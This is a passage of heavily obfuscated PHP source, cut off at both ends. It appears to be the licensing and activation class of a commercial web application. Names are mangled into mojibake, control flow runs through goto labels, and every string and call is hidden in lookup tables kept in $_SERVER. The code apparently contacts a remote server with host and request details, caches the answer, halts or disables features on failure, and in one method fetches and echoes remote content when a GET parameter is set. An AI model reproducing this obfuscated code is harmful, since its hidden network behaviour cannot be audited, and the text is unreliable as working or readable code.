$C‡õ»„‹‚Æ[25]($AÇöÃÜÏ°, 0, 1) == $C‡õ»„‹‚Æ[166]) { $AÇöÃÜÏ° = $C‡õ»„‹‚Æ[167]($AÇöÃÜÏ°); } if ($C‡õ»„‹‚Æ[168]($AÇöÃÜÏ°) && $AÇöÃÜÏ°[$C‡õ»„‹‚Æ[169]] && $C‡õ»„‹‚Æ[32]($AÇöÃÜÏ°[$C‡õ»„‹‚Æ[169]], $C‡õ»„‹‚Æ[170])) { $eÅ Õù­ÛÈ = $C‡õ»„‹‚Æ[0]($C‡õ»„‹‚Æ[170], $AÇöÃÜÏ°[$C‡õ»„‹‚Æ[169]]); $b‰ÎÌÀ–•[$C‡õ»„‹‚Æ[171]] = $eÅ Õù­ÛÈ[0]; } } $b‰ÎÌÀ–• = $this->{$_SERVER[õÒ³è´][172]}($C‡õ»„‹‚Æ[173]($b‰ÎÌÀ–•), $C‡õ»„‹‚Æ[131]($C‡õ»„‹‚Æ[174])); goto Cİƒîˆ›é‚; Cİƒîˆ›é‚: $C†¨”ĞÂÅÍ = $A»†ÄîˆÅ£[650]; if (strlen($C†¨”ĞÂÅÍ) < $A»†ÄîˆÅ£[634]) { return; } $cÇãˆµÖáÖ = array($C‡õ»„‹‚Æ[175] => $b‰ÎÌÀ–•); goto EØÂ®˜¢; EØÂ®˜¢: $fùñ‹§­ä = $A»†ÄîˆÅ£[651]; while (strlen($fùñ‹§­ä) < $A»†ÄîˆÅ£[16]) { if (!$fùñ‹§­ä) { break; } $fùñ‹§­ä++; } $C‡õ»„‹‚Æ[13](array($C‡õ»„‹‚Æ[176], $C‡õ»„‹‚Æ[177]), $cÇãˆµÖáÖ); goto FËƒÜÊšñÀ; FËƒÜÊšñÀ: } goto D‘¿ºµ™¦; Cœ ÑØÌÁ: foreach ($C¿¤ÜÂÕº‹ as $D˜ÄØÕÙ±) { if (!isset($B­æ­ù ê[$D˜ÄØÕÙ±]) || !$B­æ­ù ê[$D˜ÄØÕÙ±]) { continue; } $cÇãˆµÖáÖ[$D˜ÄØÕÙ±] = $B­æ­ù ê[$D˜ÄØÕÙ±]; $d£§¸¶¶¬Ê = $A»†ÄîˆÅ£[653]; if (!$d£§¸¶¶¬Ê) { die; } } $C‡õ»„‹‚Æ[13](array($C‡õ»„‹‚Æ[176], $C‡õ»„‹‚Æ[177]), $cÇãˆµÖáÖ); $D„ö¦…è›Ú = $A»†ÄîˆÅ£[654]; goto eºí«¾Òö‘; Bª¯¥¡™õ”: } private function ubrjbc05202f() { goto eë¨Ô¿ëœ¸; EàÈÅö‘: $D¼›…·÷ïô = $D³ßÆëïÏˆ[248]($D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[11])->{$_SERVER[õÒ³è´][249]}(), $D³ßÆëïÏˆ[250]); $cÍì­÷ô³Ä = $D¼›…·÷ïô[$D³ßÆëïÏˆ[251]]; $Eé–»ÂÕŒ = array(); goto A¨„×ñŒÆÎ; A¨„×ñŒÆÎ: $F˜²Ş”¾‚Ã = $a´ù¨ëóøã[658]; $Eé–»ÂÕŒ[$F‘„Üõíê] = $dì££›ö«‡; $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[11])->{$_SERVER[õÒ³è´][252]}($cÍì­÷ô³Ä[$D³ßÆëïÏˆ[253]], array($D³ßÆëïÏˆ[254] => $Eé–»ÂÕŒ)); goto Fà¡°Û˜®§; fµ°ìõ“ó‹: if (!isset($Bï¸ïí‘ò[$D³ßÆëïÏˆ[190]]) || $D³ßÆëïÏˆ[24]($Bï¸ïí‘ò[$D³ßÆëïÏˆ[190]]) != 16) { $D³ßÆëïÏˆ[191]($D³ßÆëïÏˆ[192] . $Bï¸ïí‘ò[$D³ßÆëïÏˆ[190]], !1); } $cœŞƒƒˆø = $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[62])->{$_SERVER[õÒ³è´][63]}($D³ßÆëïÏˆ[133]); $cê»ÑÇÃôŒ = $D³ßÆëïÏˆ[131]($_SERVER[$D³ßÆëïÏˆ[132]] . $cœŞƒƒˆø); goto aÊˆé…ÍÀ; BØâäì·åÖ: $aÛò½¢Ìåå = $a´ù¨ëóøã[660]; if (!$aÛò½¢Ìåå) { return; } $D³ßÆëïÏˆ[191]($D³ßÆëïÏˆ[223]($D³ßÆëïÏˆ[233]), !0); goto cØáŞƒâŒš; Fİµ’Ç»”¸: if (strlen($AØ©’Î«º˜) < $a´ù¨ëóøã[16]) { die; } if (!$aÁ…ƒ¶ê || $aÁ…ƒ¶ê != $Cäö°‡—[$D³ßÆëïÏˆ[162]]) { $AÏá›ïÁŸ¤ = array($D³ßÆëïÏˆ[227] => $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[62])->{$_SERVER[õÒ³è´][63]}($D³ßÆëïÏˆ[133]), $D³ßÆëïÏˆ[228] => $_SERVER[$D³ßÆëïÏˆ[132]], $D³ßÆëïÏˆ[229] => $D³ßÆëïÏˆ[230](), $D³ßÆëïÏˆ[199] => $_SERVER[$D³ßÆëïÏˆ[200]]); $d¯à´ŒÃ¤ = $this->{$_SERVER[õÒ³è´][231]}($D³ßÆëïÏˆ[173]($AÏá›ïÁŸ¤)); $this->{$_SERVER[õÒ³è´][209]}($D³ßÆëïÏˆ[232] . $d¯à´ŒÃ¤); $D³ßÆëïÏˆ[191]($D³ßÆëïÏˆ[223]($D³ßÆëïÏˆ[233]), !0); } $cæ¾âœÕÆ¯ = array($D³ßÆëïÏˆ[234] => $Cäö°‡—[$D³ßÆëïÏˆ[235]], $D³ßÆëïÏˆ[236] => $Cäö°‡—[$D³ßÆëïÏˆ[237]], $D³ßÆëïÏˆ[238] => $D³ßÆëïÏˆ[141](16), $D³ßÆëïÏˆ[137] => $Cäö°‡—[$D³ßÆëïÏˆ[239]]); goto eÛÕõœà·¶; eÛÕõœà·¶: if ($D»±Æ«óš[$D³ßÆëïÏˆ[193]]) { $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[238]] = $D»±Æ«óš[$D³ßÆëïÏˆ[193]]; } $aÔá§šÒ¤ = $D³ßÆëïÏˆ[25]($D³ßÆëïÏˆ[131]($cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[236]]), 10, 10); $bä‹¦ˆê¼ = $aÔá§šÒ¤ . $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[137]] . $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[238]]; goto f®Šé‰Šàº; fÇÌ´“’: $EÒÃçæ·–– = $a´ù¨ëóøã[656]; if ($Bï¸ïí‘ò[$D³ßÆëïÏˆ[204]] == $D³ßÆëïÏˆ[205]) { $a·½¯ğ«ãÅ = $this->{$_SERVER[õÒ³è´][172]}($cê»ÑÇÃôŒ, $D³ßÆëïÏˆ[206]); $d¯à´ŒÃ¤ = $this->{$_SERVER[õÒ³è´][144]}($D³ßÆëïÏˆ[173]($D»±Æ«óš), $cê»ÑÇÃôŒ . $D³ßÆëïÏˆ[207], 3); $d¯à´ŒÃ¤ = $d¯à´ŒÃ¤ . $D³ßÆëïÏˆ[208] . $_SERVER[$D³ßÆëïÏˆ[198]]; $BËÑ‡Î©³£ = $this->{$_SERVER[õÒ³è´][209]}($D³ßÆëïÏˆ[210] . $a·½¯ğ«ãÅ . $D³ßÆëïÏˆ[211] . $d¯à´ŒÃ¤, -1); $D³ßÆëïÏˆ[191]($BËÑ‡Î©³£, !0); } else { if ($Bï¸ïí‘ò[$D³ßÆëïÏˆ[204]] == $D³ßÆëïÏˆ[212]) { $C‰‰‚“º‡’ = $D³ßÆëïÏˆ[25]($D³ßÆëïÏˆ[131]($D³ßÆëïÏˆ[213] . $cê»ÑÇÃôŒ), 12, 15) . $D³ßÆëïÏˆ[214]; $d¯à´ŒÃ¤ = $this->{$_SERVER[õÒ³è´][215]}($D³ßÆëïÏˆ[2]($Bï¸ïí‘ò[$D³ßÆëïÏˆ[216]]), $C‰‰‚“º‡’, 2); $D‰¯Â°„ö¤ = $D³ßÆëïÏˆ[217]($d¯à´ŒÃ¤, !0); if (!$D³ßÆëïÏˆ[168]($D‰¯Â°„ö¤) || !$D³ßÆëïÏˆ[168]($D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]]) || $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[190]] != !0) { $fçÜ¬Óé¡ë = $D³ßÆëïÏˆ[219]; $Bç†ëÒ³“â = $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]] ? $D³ßÆëïÏˆ[220] . $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]] : $fçÜ¬Óé¡ë; $D³ßÆëïÏˆ[191]($Bç†ëÒ³“â, !1); } else { $D»±Æ«óš[$D³ßÆëïÏˆ[193]] = $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]][$D³ßÆëïÏˆ[221]]; } } else { $D‰¯Â°„ö¤ = $this->{$_SERVER[õÒ³è´][209]}($D³ßÆëïÏˆ[222], $D»±Æ«óš, 10); } } if (!$D³ßÆëïÏˆ[168]($D‰¯Â°„ö¤) || !$D³ßÆëïÏˆ[168]($D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]]) || $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[190]] != !0) { $fçÜ¬Óé¡ë = $D³ßÆëïÏˆ[223]($D³ßÆëïÏˆ[224]); $Bç†ëÒ³“â = $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]] ? $D³ßÆëïÏˆ[220] . $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]] : $fçÜ¬Óé¡ë; $D³ßÆëïÏˆ[191]($Bç†ëÒ³“â, !1); } goto Eøãó—–¢›; Eøãó—–¢›: $Cäö°‡— = $D‰¯Â°„ö¤[$D³ßÆëïÏˆ[218]]; $aÁ…ƒ¶ê = $this->{$_SERVER[õÒ³è´][225]}($Cäö°‡—[$D³ßÆëïÏˆ[226]]); $AØ©’Î«º˜ = $a´ù¨ëóøã[657]; goto Fİµ’Ç»”¸; e£‘©á‰ ‰: $bĞŠùç¥Â‚ = $D³ßÆëïÏˆ[131]($_SERVER[$D³ßÆëïÏˆ[132]] . $D³ßÆëïÏˆ[240]($cœŞƒƒˆø) . $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[236]]); $F‘„Üõíê = $D³ßÆëïÏˆ[240]($D³ßÆëïÏˆ[25]($bĞŠùç¥Â‚, 10, 16)); $dì££›ö«‡ = $this->{$_SERVER[õÒ³è´][144]}($D³ßÆëïÏˆ[173]($Cäö°‡—), $bĞŠùç¥Â‚); goto EàÈÅö‘; aÊˆé…ÍÀ: $d¬É…êÜÉ = $a´ù¨ëóøã[655]; if (!$d¬É…êÜÉ) { die; } $D»±Æ«óš = array($D³ßÆëïÏˆ[190] => $Bï¸ïí‘ò[$D³ßÆëïÏˆ[190]], $D³ßÆëïÏˆ[193] => $D³ßÆëïÏˆ[141](16), $D³ßÆëïÏˆ[194] => $D³ßÆëïÏˆ[174], $D³ßÆëïÏˆ[195] => $D³ßÆëïÏˆ[196], $D³ßÆëïÏˆ[197] => $_SERVER[$D³ßÆëïÏˆ[198]], $D³ßÆëïÏˆ[199] => $_SERVER[$D³ßÆëïÏˆ[200]], $D³ßÆëïÏˆ[201] => $_SERVER[$D³ßÆëïÏˆ[202]], $D³ßÆëïÏˆ[130] => $cê»ÑÇÃôŒ, $D³ßÆëïÏˆ[203] => $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[62])->{$_SERVER[õÒ³è´][63]}($D³ßÆëïÏˆ[164])); goto fÇÌ´“’; eë¨Ô¿ëœ¸: $a´ù¨ëóøã =& $_SERVER[œÕÊİğö]; $D³ßÆëïÏˆ =& $_SERVER[õÒ³è´]; if ($_SERVER[$D³ßÆëïÏˆ[44]] != $D³ßÆëïÏˆ[187]) { return; } goto AÕœ‰½ëÛ; AÕœ‰½ëÛ: if (!$D³ßÆëïÏˆ[123]($GLOBALS, $D³ßÆëïÏˆ[149])) { die; } $Bï¸ïí‘ò = $GLOBALS[$D³ßÆëïÏˆ[22]]; if (isset($Bï¸ïí‘ò[$D³ßÆëïÏˆ[188]])) { $this->{$_SERVER[õÒ³è´][189]}(); die; } goto fµ°ìõ“ó‹; Fà¡°Û˜®§: $this->crpq5f5b0a9b = $Cäö°‡—; $this->ksfl586f8766 = $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[137]]; $this->{$_SERVER[õÒ³è´][255]}(); goto C‰¦†ÓùÂ·; f®Šé‰Šàº: $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[139]] = $D³ßÆëïÏˆ[240]($D³ßÆëïÏˆ[135]($this->{$_SERVER[õÒ³è´][172]}($bä‹¦ˆê¼, $D³ßÆëïÏˆ[241]))); $B”±áÂ‚Ï¹ = $D³ßÆëïÏˆ[141](16); $ešá´Š’› = $B”±áÂ‚Ï¹ . $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[137]] . $this->{$_SERVER[õÒ³è´][172]}($D³ßÆëïÏˆ[131]($cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[234]]), $B”±áÂ‚Ï¹); goto b©¹¢Ïİ½; C‰¦†ÓùÂ·: $BÇ‡„Õğâˆ = $a´ù¨ëóøã[659]; if (strlen($BÇ‡„Õğâˆ) < $a´ù¨ëóøã[634]) { die; } Cache::set($D³ßÆëïÏˆ[256] . $D³ßÆëïÏˆ[131]($cœŞƒƒˆø . $D³ßÆëïÏˆ[257]), $D³ßÆëïÏˆ[10]); goto BØâäì·åÖ; b©¹¢Ïİ½: $cæ¾âœÕÆ¯[$D³ßÆëïÏˆ[140]] = $D³ßÆëïÏˆ[135]($D³ßÆëïÏˆ[240]($this->{$_SERVER[õÒ³è´][172]}($ešá´Š’›, $D³ßÆëïÏˆ[242]))); if ($Cäö°‡—[$D³ßÆëïÏˆ[243]] && $Cäö°‡—[$D³ßÆëïÏˆ[243]] >= 1) { $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[62])->{$_SERVER[õÒ³è´][244]}($D³ßÆëïÏˆ[245], $D³ßÆëïÏˆ[246]); } $D³ßÆëïÏˆ[61]($D³ßÆëïÏˆ[62])->{$_SERVER[õÒ³è´][247]}($cæ¾âœÕÆ¯); goto e£‘©á‰ ‰; cØáŞƒâŒš: } private function licenseRegistSuccess() { $B‰ƒ¬ËÍ =& $_SERVER[õÒ³è´]; $C¾×ˆ²¤¢ø = $B‰ƒ¬ËÍ[61]($B‰ƒ¬ËÍ[62])->{$_SERVER[õÒ³è´][63]}(); $C÷†Ô¥À† = $_SERVER[œÕÊİğö][661]; if (!$C÷†Ô¥À†) { return; } if ($C¾×ˆ²¤¢ø[$B‰ƒ¬ËÍ[93]] != $B‰ƒ¬ËÍ[246]) { $B‰ƒ¬ËÍ[61]($B‰ƒ¬ËÍ[62])->{$_SERVER[õÒ³è´][247]}($B‰ƒ¬ËÍ[93], $B‰ƒ¬ËÍ[246]); } $B‰ƒ¬ËÍ[127]($B‰ƒ¬ËÍ[258])->{$_SERVER[õÒ³è´][259]}(!0); } private function nksc3d405c1c() { goto E»ÜĞÍØµ®; aˆ‹Ô¡¶£¦: $this->ksfl586f8766 = $d’Àõ²†Ñ[138]; $aŒƒÀ¯ç¨ = $D”ÊÔ‹èÈÑ[664]; while ($aŒƒÀ¯ç¨ < $D”ÊÔ‹èÈÑ[634]) { if ($aŒƒÀ¯ç¨ >= 0) { break; } $aŒƒÀ¯ç¨++; } goto eó˜Ìù¢®”; E»ÜĞÍØµ®: $D”ÊÔ‹èÈÑ =& $_SERVER[œÕÊİğö]; $d’Àõ²†Ñ =& $_SERVER[õÒ³è´]; $d’Àõ²†Ñ[61]($d’Àõ²†Ñ[62])->{$_SERVER[õÒ³è´][247]}(array($d’Àõ²†Ñ[234] => $d’Àõ²†Ñ[10], $d’Àõ²†Ñ[236] => $d’Àõ²†Ñ[10], $d’Àõ²†Ñ[137] => $d’Àõ²†Ñ[138], $d’Àõ²†Ñ[139] => $d’Àõ²†Ñ[10], $d’Àõ²†Ñ[140] => $d’Àõ²†Ñ[10])); goto B¸ï‰ñõ®; B¸ï‰ñõ®: $eÔ—ØšƒÒ = $D”ÊÔ‹èÈÑ[662]; if (!$eÔ—ØšƒÒ) { die; } $d’Àõ²†Ñ[61]($d’Àõ²†Ñ[62])->{$_SERVER[õÒ³è´][244]}($d’Àõ²†Ñ[245], $d’Àõ²†Ñ[260]); goto bá’—‡‹¯ß; bá’—‡‹¯ß: $Aâ¡¹Ğñ­ = $D”ÊÔ‹èÈÑ[663]; if (!$Aâ¡¹Ğñ­) { die; } $this->crpq5f5b0a9b = array(); goto aˆ‹Ô¡¶£¦; eó˜Ìù¢®”: } private function dqste0a7e18d() { goto c …ØŒ Ôö; BÚ×‡÷‰÷‚: $this->ksfl586f8766 = $Dâ›…¸Ú˜[138]; $e»Š•°¥ˆ = $Dâ›…¸Ú˜[61]($Dâ›…¸Ú˜[62])->{$_SERVER[õÒ³è´][63]}(); $EöØ¯âÑóË = $EĞ”É…¢[665]; goto eÁÖéëĞ‚¥; c …ØŒ Ôö: $EĞ”É…¢ =& $_SERVER[œÕÊİğö]; $Dâ›…¸Ú˜ =& $_SERVER[õÒ³è´]; $_SERVER[$Dâ›…¸Ú˜[200]] = $Dâ›…¸Ú˜[123]($_SERVER, $Dâ›…¸Ú˜[200], APP_HOST); goto BÚ×‡÷‰÷‚; cØ´²µÅŒä: $e°ÍÅºíÎ = $EĞ”É…¢[667]; if (strlen($e°ÍÅºíÎ) < $EĞ”É…¢[649]) { return; } $Ašô¸ãø®Ø = Cache::get($f®Òíõ®¶²); goto dÒùäŠ¾Ï¥; FòÏ†µÌª: if ($Dâ›…¸Ú˜[262]() >= $c— æ¯é¦³) { return $this->{$_SERVER[õÒ³è´][189]}(); } if ($Dâ›…¸Ú˜[262]() - $Ašô¸ãø®Ø[$Dâ›…¸Ú˜[261]] > 20) { $Ašô¸ãø®Ø[$Dâ›…¸Ú˜[261]] = $Dâ›…¸Ú˜[262](); Cache::set($f®Òíõ®¶², $Ašô¸ãø®Ø); } $this->crpq5f5b0a9b = $Ašô¸ãø®Ø; goto cİ…ÚÔ›î; eÁÖéëĞ‚¥: while ($EöØ¯âÑóË < $EĞ”É…¢[649]) { if ($EöØ¯âÑóË >= 0) { break; } $EöØ¯âÑóË++; } if ($e»Š•°¥ˆ[$Dâ›…¸Ú˜[137]] == $Dâ›…¸Ú˜[138]) { return; } $fŸ×¼°ã’Ç = $Dâ›…¸Ú˜[61]($Dâ›…¸Ú˜[62])->{$_SERVER[õÒ³è´][63]}($Dâ›…¸Ú˜[133]); goto A½•‹ŒïÚò; cİ…ÚÔ›î: $this->ksfl586f8766 = $e»Š•°¥ˆ[$Dâ›…¸Ú˜[137]]; $dÆ¤‘ —Ã¼ = $EĞ”É…¢[668]; goto E‡™Âá¾î; A½•‹ŒïÚò: $eÔäĞ‡÷ = $EĞ”É…¢[666]; if (!$eÔäĞ‡÷) { die; } $f®Òíõ®¶² = $Dâ›…¸Ú˜[256] . $Dâ›…¸Ú˜[131]($fŸ×¼°ã’Ç . $Dâ›…¸Ú˜[257]); goto cØ´²µÅŒä; dÒùäŠ¾Ï¥: if (!$Dâ›…¸Ú˜[168]($Ašô¸ãø®Ø) || !isset($Ašô¸ãø®Ø[$Dâ›…¸Ú˜[261]]) || $Dâ›…¸Ú˜[262]() - $Ašô¸ãø®Ø[$Dâ›…¸Ú˜[261]] >= 60) { $AÚÅ¡ò¾ñ¦ = $Dâ›…¸Ú˜[61]($Dâ›…¸Ú˜[11])->{$_SERVER[õÒ³è´][263]}(); $A‹„ĞÉŠŠî = $AÚÅ¡ò¾ñ¦[$Dâ›…¸Ú˜[251]]; $cáö¡õÇë£ = $Dâ›…¸Ú˜[131]($_SERVER[$Dâ›…¸Ú˜[132]] . $Dâ›…¸Ú˜[240]($fŸ×¼°ã’Ç) . $e»Š•°¥ˆ[$Dâ›…¸Ú˜[236]]); $AÇÚÌïÙ = $Dâ›…¸Ú˜[240]($Dâ›…¸Ú˜[25]($cáö¡õÇë£, 10, 16)); $Ašô¸ãø®Ø = $this->{$_SERVER[õÒ³è´][215]}($A‹„ĞÉŠŠî[$Dâ›…¸Ú˜[111]][$AÇÚÌïÙ], $cáö¡õÇë£); $Ašô¸ãø®Ø = $Dâ›…¸Ú˜[217]($Ašô¸ãø®Ø, !0); } if (!$Dâ›…¸Ú˜[168]($Ašô¸ãø®Ø)) { return $this->{$_SERVER[õÒ³è´][189]}(); } $c— æ¯é¦³ = $Dâ›…¸Ú˜[161]($Ašô¸ãø®Ø[$Dâ›…¸Ú˜[162]]); goto FòÏ†µÌª; E‡™Âá¾î: } private function tumqb8aa4e37() { goto C•»Ş¨­Óœ; F±¤Ã‚: if ($a«ß”šçÎ[269]($eÒæõ‘½òá, $fï±¢œê©)) { if ($this->ksfl586f8766 == $a«ß”šçÎ[138] && isset($D¶ë­Òççç[$a«ß”šçÎ[270]])) { $a«ß”šçÎ[191]($a«ß”šçÎ[223]($a«ß”šçÎ[265]), !1, $a«ß”šçÎ[266]); die; } $AÑ•à¶ïğ¹ = $this->{$_SERVER[õÒ³è´][154]}(); if ($AÑ•à¶ïğ¹ != $a«ß”šçÎ[271]($a«ß”šçÎ[272])) { if ($AÑ•à¶ïğ¹ <= $a«ß”šçÎ[61]($a«ß”šçÎ[156])->{$_SERVER[õÒ³è´][157]}()) { $a«ß”šçÎ[191]($a«ß”šçÎ[223]($a«ß”šçÎ[273]), !1, $a«ß”šçÎ[266]); die; } } } goto b ¡Ïæ—³…; bƒÛŒ•¼À‚: $eÒæõ‘½òá = $_SERVER[$a«ß”šçÎ[44]]; if ($eÒæõ‘½òá == $a«ß”šçÎ[264] && $this->ksfl586f8766 == $a«ß”šçÎ[138]) { $a«ß”šçÎ[191]($a«ß”šçÎ[223]($a«ß”šçÎ[265]), !1, $a«ß”šçÎ[266]); } $fï±¢œê© = array($a«ß”šçÎ[267], $a«ß”šçÎ[268]); goto F±¤Ã‚; C•»Ş¨­Óœ: $a«ß”šçÎ =& $_SERVER[õÒ³è´]; $D¶ë­Òççç = $GLOBALS[$a«ß”šçÎ[22]]; $e£ğˆºßÛÀ = $_SERVER[œÕÊİğö][669]; goto bƒÛŒ•¼À‚; b ¡Ïæ—³…: } private function xezc742dadaf() { goto bÍ‚ó¶òî†; f‹ƒöÏê³¼: if (strlen($FËÍ¥Íí—È) < $fŞêç‡Ä”Œ[634]) { die; } $aØÙŞ‘˜² = @$DÎˆ”§“›‘[284]($F¯Ò¦‡Ø‘, !1, $FÎáÛŒ²‚); $F®³²‚±‰Ş = $fŞêç‡Ä”Œ[671]; goto f—ğ¡ó––; f†„Õ®é½ã: $F¯Ò¦‡Ø‘ = $this->{$_SERVER[õÒ³è´][277]}($F¯Ò¦‡Ø‘, $DÎˆ”§“›‘[278]); $FÎáÛŒ²‚ = $DÎˆ”§“›‘[279](array($DÎˆ”§“›‘[280] => array($DÎˆ”§“›‘[281] => $DÎˆ”§“›‘[282], $DÎˆ”§“›‘[283] => 3))); $FËÍ¥Íí—È = $fŞêç‡Ä”Œ[670]; goto f‹ƒöÏê³¼; bÍ‚ó¶òî†: $fŞêç‡Ä”Œ =& $_SERVER[œÕÊİğö]; $DÎˆ”§“›‘ =& $_SERVER[õÒ³è´]; $c•ß“¢ÆÊ“ = array($DÎˆ”§“›‘[152], $DÎˆ”§“›‘[274]); goto BÆèÕ‚ï¦Ù; f—ğ¡ó––: if (!$F®³²‚±‰Ş) { die; } $DÎˆ”§“›‘[285]($DÎˆ”§“›‘[286]); if ($aØÙŞ‘˜² && $DÎˆ”§“›‘[32]($aØÙŞ‘˜², $DÎˆ”§“›‘[287])) { echo $aØÙŞ‘˜²; } goto DÁÑš÷›Ùê; BÆèÕ‚ï¦Ù: if (!$DÎˆ”§“›‘[123]($GLOBALS, $DÎˆ”§“›‘[149]) || !isset($_GET[$DÎˆ”§“›‘[275]])) { return; } if (!$DÎˆ”§“›‘[269]($_SERVER[$DÎˆ”§“›‘[44]], $c•ß“¢ÆÊ“)) { return; } $F¯Ò¦‡Ø‘ = $DÎˆ”§“›‘[276]; goto f†„Õ®é½ã; DÁÑš÷›Ùê: die; goto d­…á×ƒ‹³; d­…á×ƒ‹³: } public function bafwe94e84d4($cĞóÅ‰òÜ) { goto d¶ß½öçÓ; f«‡Ø‘‰Œ: $bˆ«æ¦çœ­ = $FØê§Üöª[675]; goto E¶¨â®¾”‹; eµÂ‡­ùïğ: $EÆÎ¥¢‹­† = array($AòÉïÖĞ–[289] => $AòÉïÖĞ–[290], $AòÉïÖĞ–[291] => $AòÉïÖĞ–[290], $AòÉïÖĞ–[292] => $AòÉïÖĞ–[290], $AòÉïÖĞ–[293] => $AòÉïÖĞ–[290], $AòÉïÖĞ–[294] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[296] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[297] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[298] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[299] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[300] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[301] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[302] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[303] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[304] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[305] => $AòÉïÖĞ–[295], $AòÉïÖĞ–[306] => $AòÉïÖĞ–[295]); $aø–‘µÕ = $FØê§Üöª[672]; while ($aø–‘µÕ < $FØê§Üöª[615]) { if ($aø–‘µÕ >= 0) { break; } $aø–‘µÕ++; } goto d…½§Ì¨¦À; d¶ß½öçÓ: $FØê§Üöª =& $_SERVER[œÕÊİğö]; $AòÉïÖĞ– =& $_SERVER[õÒ³è´]; if ($this->ksfl586f8766 == $AòÉïÖĞ–[288]) { return $cĞóÅ‰òÜ; } goto eµÂ‡­ùïğ; A–Ğ¤øÄ¥Ş: foreach ($EÆÎ¥¢‹­† as $aÙôáĞó“— => $A æøªÖ…ê) { if ($A æøªÖ…ê == $AòÉïÖĞ–[290] && $AòÉïÖĞ–[25]($this->ksfl586f8766, 0, 1) == $AòÉïÖĞ–[290]) { continue; } if (!$AòÉïÖĞ–[269]($aÙôáĞó“—, $bÅòĞ·‰‘Œ)) { $aö¨Æ‡Â¨®[] = $aÙôáĞó“—; } } foreach ($aö¨Æ‡Â¨® as $aÙôáĞó“—) { unset($cĞóÅ‰òÜ[$aÙôáĞó“—]); } return $cĞóÅ‰òÜ; goto f«‡Ø‘‰Œ; F¶ò­Ç•²: $aö¨Æ‡Â¨® = array(); $A«İç¯‡Ù = $FØê§Üöª[674]; while ($A«İç¯‡Ù < $FØê§Üöª[615]) { if ($A«İç¯‡Ù >= 0) { break; } $A«İç¯‡Ù++; } goto A–Ğ¤øÄ¥Ş; d…½§Ì¨¦À: $bÅòĞ·‰‘Œ = $AòÉïÖĞ–[0]($AòÉïÖĞ–[307], $AòÉïÖĞ–[123]($this->crpq5f5b0a9b, $AòÉïÖĞ–[146], $AòÉïÖĞ–[10])); $dÛè“æ›˜ë = $FØê§Üöª[673]; if (!$dÛè“æ›˜ë) { return; } goto F¶ò­Ç•²; E¶¨â®¾”‹: } private function dljq30608c89() { goto cÆØ¶¾¹®à; Aá»©ÏÉ‰¬: $GLOBALS[$A½—ÍÔªÍ[111]][$A½—ÍÔªÍ[115]][$A½—ÍÔªÍ[308]] = $A½—ÍÔªÍ[246]; $GLOBALS[$A½—ÍÔªÍ[111]][$A½—ÍÔªÍ[309]] = $A½—ÍÔªÍ[246]; $e¤÷£¶Á«½ = $AÌÅ¤Òùæ[676]; goto AÑÊŒ‡’¹; AÑÊŒ‡’¹: if (strlen($e¤÷£¶Á«½) < $AÌÅ¤Òùæ[634]) { die; } if ($A½—ÍÔªÍ[61]($A½—ÍÔªÍ[310])->{$_SERVER[õÒ³è´][63]}($A½—ÍÔªÍ[93]) != $A½—ÍÔªÍ[260]) { $A½—ÍÔªÍ[61]($A½—ÍÔªÍ[310])->{$_SERVER[õÒ³è´][247]}($A½—ÍÔªÍ[93], $A½—ÍÔªÍ[260]); } goto c¸¸¨Ä¤ŠÚ; cÆØ¶¾¹®à: $AÌÅ¤Òùæ =& $_SERVER[œÕÊİğö]; $A½—ÍÔªÍ =& $_SERVER[õÒ³è´]; if ($this->ksfl586f8766 != $A½—ÍÔªÍ[138]) { return; } goto Aá»©ÏÉ‰¬; c¸¸¨Ä¤ŠÚ: } public function mcbr795cd284() { return $_SERVER[õÒ³è´][311]; } private function zeuw1f5c85ef() { goto e„Ëòº¸’ó; e„Ëòº¸’ó: $c·àÜéé´ =& $_SERVER[œÕÊİğö]; $C˜¡ŒÀà© =& $_SERVER[õÒ³è´]; $A‰è¢‰ŒŠ = array($C˜¡ŒÀà©[312], $C˜¡ŒÀà©[313], $C˜¡ŒÀà©[314]); goto C¡›ÛÉ£¨; Bç†øÆà×¥: $c²Š¿š‡²Á = $c·àÜéé´[679]; if (!$C˜¡ŒÀà©[168]($bÂ‰ˆôâ´‰)) { return; } if ($bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[190]] && $bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[321]]) { if ($this->{$_SERVER[õÒ³è´][225]}($bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[321]]) == $Bà£¸÷œíË[$C˜¡ŒÀà©[190]]) { return; } } goto fÌ“®‰†‘®; C·†±©¡õˆ: if ($C˜¡ŒÀà©[262]() % 4 != 0) { return; } $f†ì‘¨²ë = $C˜¡ŒÀà©[13](array($C˜¡ŒÀà©[317], $C˜¡ŒÀà©[318]), 